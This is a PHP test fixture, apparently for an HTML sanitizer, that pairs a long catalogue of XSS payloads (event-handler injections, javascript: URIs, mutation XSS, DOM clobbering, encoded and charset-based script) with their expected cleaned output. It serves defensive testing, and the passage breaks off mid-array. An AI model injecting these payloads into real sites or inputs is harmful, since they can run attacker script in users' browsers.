<?php

// See: https://github.com/cure53/DOMPurify/blob/master/test/fixtures/expect.js

$dataTest = [
    [
        'title'    => "Don't remove ARIA attributes if not prohibited",
        'payload'  => '<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>',
        'expected' => '<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>',
    ],
    [
        'title'    => 'safe usage of URI-like attribute values',
        'payload'  => '<b href="javascript:alert(1)" title="javascript:alert(2)"></b>',
        'expected' => '<b title="javascript:alert(2)"></b>',
    ],
    [
        'title'    => 'src Attributes for IMG, AUDIO, VIDEO and SOURCE (see #131)',
        'payload'  => '<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">',
        'expected' => '<img src="data:,123" /><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012" /><div>',
    ],
    [
        'title'    => 'DOM Clobbering against document.createElement() (see #47)',
        'payload'  => '<img src=x name=createElement><img src=y id=createElement>',
        'expected' => '',
    ],
    [
        'title'    => 'DOM Clobbering against an empty cookie',
        'payload'  => '<img src=x name=cookie>',
        'expected' => '',
    ],
    [
        'title'    => 'JavaScript URIs using Unicode LS/PS I',
        'payload'  => "123<a href='\u2028javascript:alert(1)'>I am a dolphin!</a>",
        'expected' => '123<a href="#">I am a dolphin!</a>',
    ],
    [
        'title'    => 'JavaScript URIs using Unicode Whitespace',
        'payload'  => "123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>",
        'expected' => '123<a href="#">CLICK</a>',
    ],
    [
        'title'    => 'Image with data URI src',
        'payload'  => '<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>',
        'expected' => '',
    ],
    [
        'title'    => 'Image with data URI src with whitespace',
        'payload'  => "<img src=\"\r\ndata:image/jpeg,ab798ewqxbaudbuoibeqbla\">",
        'expected' => '<img src="data:image/jpeg,ab798ewqxbaudbuoibeqbla" />',
    ],
    [
        'title'    => 'Image with JavaScript URI src (DoS on Firefox)',
        'payload'  => "<img src='javascript:while(1){}'>",
        'expected' => '<img src="#" />',
    ],
    [
        'title'    => 'Link with data URI href',
        'payload'  => '<a href=data:,evilnastystuff>clickme</a>',
        'expected' => '',
    ],
    [
        'title'    => 'Simple numbers',
        'payload'  => '123456',
        'expected' => '123456',
    ],
    [
        'title'    => 'DOM clobbering XSS by @irsdl using attributes',
        'payload'  => "<form onmouseover='alert(1)'><input name=\"attributes\"><input name=\"attributes\">",
        'expected' => '<form><input name="attributes" /><input name="attributes" />',
    ],
    [
        'title'    => 'DOM clobbering: getElementById',
        'payload'  => '<img src=x name=getElementById>',
        'expected' => '',
    ],
    [
        'title'    => 'DOM clobbering: location',
        'payload'  => '<a href="#some-code-here" id="location">invisible',
        'expected' => '<a href="#some-code-here" id="location">invisible',
    ],
    [
        'title'    => 'onclick, onsubmit, onfocus; DOM clobbering: parentNode',
        'payload'  => '<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: nodeName',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: nodeType',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: children',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: attributes',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: removeChild',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: removeAttributeNode',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>',
        'expected' => '',
    ],
    [
        'title'    => 'onsubmit, onfocus; DOM clobbering: setAttribute',
        'payload'  => '<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>',
        'expected' => '',
    ],
    [
        'title'    => '&gt;style&lt;',
        'payload'  => '<style>*{color: red}</style>',
        'expected' => '*{color: red}',
    ],
    [
        'title'    => 'HTML paragraph with text',
        'payload'  => '<p>hello</p>',
        'expected' => '<p>hello</p>',
    ],
    [
        'title'    => 'mXSS Variation I',
        'payload'  => '<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>',
        'expected' => '&lt;img onerror=&quot;alert(1);//&quot; src=x&gt;',
    ],
    [
        'title'    => 'mXSS Variation II',
        'payload'  => "<img src=x id/=' onerror=alert(1)//'>",
        'expected' => '',
    ],
    [
        'title'    => 'Textarea and comments enabling img element',
        'payload'  => '<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->',
        'expected' => '<textarea>@shafigullin</textarea>',
    ],
    [
        'title'    => 'Img element inside noscript terminated inside comment',
        'payload'  => '<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>',
        'expected' => '<b>',
    ],
    [
        'title'    => 'Img element inside noscript terminated inside attribute',
        'payload'  => '<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>',
        'expected' => '<b>',
    ],
    [
        'title'    => 'Img element inside shadow DOM template',
        'payload'  => '<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>',
        'expected' => '<template><s><template><s>',
    ],
    [
        'title'    => 'Low-range-ASCII obfuscated JavaScript URI',
        'payload'  => "<a href=\"\u0001java\u0003script:alert(1)\">@shafigullin<a>",
        'expected' => '<a href="#">@shafigullin<a>',
    ],
    [
        'title'    => 'Img inside style inside broken option element',
        'payload'  => "\u0001<option><style></option></select><b><img src=x onerror=alert(1)></style></option>",
        'expected' => "\u0001<option>",
    ],
    [
        'title'    => 'Iframe inside option element',
        'payload'  => '<option><iframe></select><b><script>alert(1)</script>',
        'expected' => '<option><iframe>',
    ],
    [
        'title'    => 'Closing Iframe and option',
        'payload'  => '</iframe></option>',
        'expected' => '',
    ],
    [
        'title'    => 'Image after style to trick jQuery tag-completion',
        'payload'  => '<b><style><style/><img src=x onerror=alert(1)>',
        'expected' => '<b>',
    ],
    [
        'title'    => 'Image after self-closing style to trick jQuery tag-completion',
        'payload'  => '<b><style><style////><img src=x onerror=alert(1)></style>',
        'expected' => '<b>',
    ],
    [
        'title'    => 'DOM clobbering attack using name=body',
        'payload'  => '<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>',
        'expected' => '',
    ],
    [
        'title'    => 'Special esacpes in protocol handler for XSS in Blink',
        'payload'  => "<a href=\"\u0001java\u0003script:alert(1)\">@shafigullin<a>",
        'expected' => '<a href="#">@shafigullin<a>',
    ],
    [
        'title'    => 'DOM clobbering attack using activeElement',
        'payload'  => '<image name=activeElement><svg onload=alert(1)>',
        'expected' => '',
    ],
    [
        'title'    => 'DOM clobbering attack using name=body and injecting SVG + keygen',
        'payload'  => '<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using multiple unknown attributes',
        'payload'  => '<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using event handlers and unknown attributes',
        'payload'  => '<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes',
        'payload'  => '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
        'expected' => '<a href="#">CLICK ME (bypass by @shafigullin)</a>',
    ],
    [
        'title'    => 'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes (II)',
        'payload'  => '<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using unknown attributes III',
        'payload'  => '<div wow=removeme onmouseover=alert(1)>text',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using unknown attributes IV',
        'payload'  => '<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using unknown attributes V',
        'payload'  => '<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />',
        'expected' => '',
    ],
    [
        'title'    => 'Bypass using JS URI in href',
        'payload'  => '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
        'expected' => '<a href="#">CLICK ME (bypass by @shafigullin)</a>',
    ],
    [
        'title'    => '',
        'payload'  => "<form action=\"javasc\nript:alert(1)\"><button>XXX</button></form>",
        'expected' => '<form action="#"><button>XXX</button></form>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"1\"><form id=\"foobar\"></form><button form=\"foobar\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div>",
        'expected' => '<div id="1"><form id="foobar"></form><button form="foobar" formaction="#">X</button>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div>",
        'expected' => '<div id="2">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div>",
        'expected' => '<div id="3">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div>",
        'expected' => '<div id="4">0?Worker(&quot;#&quot;).onmessage=function(_)eval(_.data)',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"5\">crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="6">({set/**/$($){_/**/setter=$,_=1}}).$=alert',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div>",
        'expected' => '<div id="7">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div>",
        'expected' => '<div id="8">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div>\n\n<div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="11">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div>",
        'expected' => '<div id="12">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div>",
        'expected' => '<div id="13">01',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div>",
        'expected' => '<div id="14">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="15">({0:#0=alert/#0#/#0#(0)})',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div>",
        'expected' => '<div id="16">X',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div>",
        'expected' => '<div id="17">&gt;?xml-stylesheet href=&quot;javascript:alert(17)&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="18">alert(1)',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"19\"><meta charset=\"x-mac-farsi\">\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//[\"'`-->]]>]</div>",
        'expected' => '<div id="19">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"20\">ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"21\">Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div>",
        'expected' => '<div id="22">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"23\"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div>",
        'expected' => '<div id="23">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=\"x\"onerror=alert(24)>`>//[\"'`-->]]>]</div>",
        'expected' => '<div id="24">1',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div>",
        'expected' => '<div id="25">{alert(25)}',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div>",
        'expected' => '<div id="26">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div><div id=\"28\">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src=\".\"onerror=alert(28)>>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"27\">p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div>",
        'expected' => '<div id="29">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div>",
        'expected' => '<div id="30">@import &quot;data:,*%7bx:expression(alert(30))%7D&quot;;',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div>",
        'expected' => '<div id="31">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div>",
        'expected' => '<div id="32"><table></table>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div>",
        'expected' => '<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;">XXX</a></a><a href="#">XXX</a>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div>",
        'expected' => '<div id="34">1',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div>",
        'expected' => '<div id="35">1',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div>",
        'expected' => '<div id="36"><a style="behavior:url(#default#AnchorClick);">XXX</a>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="37">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div><div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->",
        'expected' => '<div id="38">',
    ],
    [
        'title'    => '',
        'payload'  => '<![><img src="]><img src=x onerror=alert(39)//">',
        'expected' => '',
    ],
    [
        'title'    => '',
        'payload'  => "<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href=\"]]><img src=x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>",
        'expected' => "\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"40\"><style><img src=\"</style><img src=x onerror=alert(40)//\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="40">',
    ],
    [
        'title'    => '',
        'payload'  => '<div id="41"><li style=list-style:url() onerror=alert(41)></li>',
        'expected' => '<div id="41">',
    ],
    [
        'title'    => '',
        'payload'  => "<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[\"'`-->]]>]</div>",
        'expected' => '',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"42\"><head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>",
        'expected' => '<div id="42"><a href="/./,alert(42)//#">XXX</a>',
    ],
    [
        'title'    => '',
        'payload'  => '<div id="43"><?xml version="1.0" standalone="no"?>',
        'expected' => '<div id="43">&gt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&lt;',
    ],
    [
        'title'    => '',
        'payload'  => "<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<style type=\"text/css\">\n@font-face {font-family: y; src: url(\"font.svg#x\") format(\"svg\");} body {font: 100px \"y\";}\n</style>\n</head>\n<body>Hello</body>\n</html>//[\"'`-->]]>]</div>",
        'expected' => "\n\n\n@font-face {font-family: y; src: url(&quot;font.svg#x&quot;) format(&quot;svg&quot;);} body {font: 100px &quot;y&quot;;}\n\n\nHello\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}</style>X//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"44\">*[{}@import'test.css?]{color: green;}",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX</div>//[\"'`-->]]>]</div>",
        'expected' => '<div id="46"><div style="font-family:foo}color=red;">XXX</div>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>//[\"'`-->]]>]</div>",
        'expected' => '<div id="47">alert(47)',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[\"'`-->]]>]</div>",
        'expected' => '<div id="48">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"></OBJECT>//[\"'`-->]]>]</div>",
        'expected' => '<div id="49"><OBJECT><PARAM />',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"50\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>//[\"'`-->]]>]</div>",
        'expected' => '<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"51\"><embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>//[\"'`-->]]>]</div>",
        'expected' => '<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" />',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"52\"><x style=\"behavior:url(test.sct)\">//[\"'`-->]]>]</div><div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>",
        'expected' => '<div id="52">',
    ],
    [
        'title'    => '',
        'payload'  => "<label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>//[\"'`-->]]>]</div>",
        'expected' => '<label></label>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"54\">[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="55"><video><source />',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"56\"><video onerror=\"alert(56)\"><source></source></video>//[\"'`-->]]>]</div>",
        'expected' => '<div id="56"><video><source /></video>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div>",
        'expected' => '<div id="57">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div>",
        'expected' => '<div id="58"><b>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div>",
        'expected' => '<div id="59"><div id="div1"><input value="``onmouseover=alert(59)" />',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>",
        'expected' => '<div id="60"><div style="[a]color[b]:[c]red">XXX</div>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"62\">\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"63\"><embed src=\"javascript:alert(63)\"></embed> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src=\"javascript:alert(2)\">\n<image src=\"javascript:alert(2)\"> // IE6, O10.10\u2193, OM10.0\u2193\n<script src=\"javascript:alert(3)\"></script> // IE6, O11.01\u2193, OM10.1\u2193//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"63\"><embed src=\"#\" /> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src=\"#\" />\n // IE6, O10.10\u2193, OM10.0\u2193\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div>",
        'expected' => '<div id="64">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"65\"><svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`-->]]>]</div><div id=\"66\"><?xml version=\"1.0\"?>",
        'expected' => '<div id="65">',
    ],
    [
        'title'    => '',
        'payload'  => "<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>//[\"'`-->]]>]</div>\n<div id=\"67\"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx\"\n onerror CDATA \"alert(67)\"\n onload CDATA \"alert(2)\">\n]><img />//[\"'`-->]]>]</div>",
        'expected' => "&gt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E&quot;?&lt;\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"68\"><doc xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:html=\"http://www.w3.org/1999/xhtml\">\n    <html:style /><x xlink:href=\"javascript:alert(68)\" xlink:type=\"simple\">XXX</x>\n</doc>//[\"'`-->]]>]</div>",
        'expected' => "<div id=\"68\">\n    XXX\n",
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"69\"><card xmlns=\"http://www.wapforum.org/2001/wml\"><onevent type=\"ontimer\"><go href=\"javascript:alert(69)\"/></onevent><timer value=\"1\"/></card>//[\"'`-->]]>]</div>",
        'expected' => '<div id="69">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"70\"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[\"'`-->]]>]</div>",
        'expected' => '<div id="70">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"71\"><// style=x:expression\u00028alert(71)\u00029>//[\"'`-->]]>]</div>",
        'expected' => '<div id="71">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"72\"><form><button formaction=\"javascript:alert(72)\">X</button>//[\"'`-->]]>]</div>",
        'expected' => '<div id="72"><form><button formaction="#">X</button>',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"73\"><event-source src=\"event.php\" onload=\"alert(73)\">//[\"'`-->]]>]</div>",
        'expected' => '<div id="73">',
    ],
    [
        'title'    => '',
        'payload'  => "<div id=\"74\"><a href=\"javascript:alert(74)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\" /></a>//[\"'`-->]]>]</div>",
        'expected' => '<div id="74"><a href="#"></a>',
    ],
    [
        'title'    => '',
